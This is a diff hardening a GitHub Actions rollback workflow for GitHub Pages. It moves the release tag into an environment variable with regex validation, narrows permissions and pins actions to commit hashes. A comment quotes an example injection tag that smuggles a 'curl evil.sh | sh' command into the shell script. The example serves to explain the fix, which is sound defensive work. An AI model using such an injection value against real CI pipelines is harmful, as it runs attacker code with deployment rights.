@@ -3,6 +3,12 @@
 # Rebuilding to recover is a gamble: the thing that broke may be in the build.
 # This takes the exact bytes that were live and verified earlier and puts them
 # back, then runs the same smoke test to prove the rollback itself worked.
+#
+# Assignment 9 hardening: release_tag used to be pasted straight into the
+# shell script as ${{ inputs.release_tag }} (zizmor: template-injection, high
+# confidence). A tag like  x"; curl evil.sh | sh; echo "  would have run as
+# code with pages:write. It now arrives as an env var and must match the
+# format the deploy workflow gives its tags before anything uses it.
 name: Rollback
 
 on:
@@ -12,10 +18,7 @@ on:
         description: "Release tag to republish (see the Releases page)"
         required: true
 
-permissions:
-  contents: read
-  pages: write
-  id-token: write
+permissions: {}
 
 concurrency:
   group: pages
@@ -23,33 +26,43 @@ concurrency:
 
 jobs:
   rollback:
-    name: Republish ${{ inputs.release_tag }}
+    name: Republish a verified build
     runs-on: ubuntu-latest
+    permissions:
+      contents: read    # download the release asset
+      pages: write
+      id-token: write
     environment:
       name: github-pages
       url: ${{ steps.deployment.outputs.page_url }}
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1
+        with:
+          persist-credentials: false
 
       - name: Fetch the chosen build
         env:
           GH_TOKEN: ${{ github.token }}
+          RELEASE_TAG: ${{ inputs.release_tag }}
         run: |
-          gh release download "${{ inputs.release_tag }}" \
+          if [[ ! "$RELEASE_TAG" =~ ^site-[0-9]{8}-[0-9]{6}-[0-9a-f]{7}$ ]]; then
+            echo "::error::'$RELEASE_TAG' is not a release tag made by deploy.yml"
+            exit 1
+          fi
+          gh release download "$RELEASE_TAG" \
             --repo "$GITHUB_REPOSITORY" --pattern 'site-*.zip' --dir .
           mkdir -p _site
           unzip -q site-*.zip -d _site
           echo "This release was built from commit $(cat _site/version.txt)"
 
-      - uses: actions/upload-pages-artifact@v3
+      - uses: actions/upload-pages-artifact@56afc609e74202658d3ffba0e8f6dda462b719fa # v3.0.1
         with:
           path: _site
 
       - id: deployment
-        uses: actions/deploy-pages@v4
+        uses: actions/deploy-pages@d6db90164ac5ed86f2b6aed7e0febac5b3c0c03e # v4.0.5
 
       - name: Confirm the rollback actually took effect
-        run: |
-          python3 scripts/smoke_test.py \
-            "${{ steps.deployment.outputs.page_url }}" \
-            "$(cat _site/version.txt)"
+        env:
+          PAGE_URL: ${{ steps.deployment.outputs.page_url }}
+        run: python3 scripts/smoke_test.py "$PAGE_URL" "$(cat _site/version.txt)"
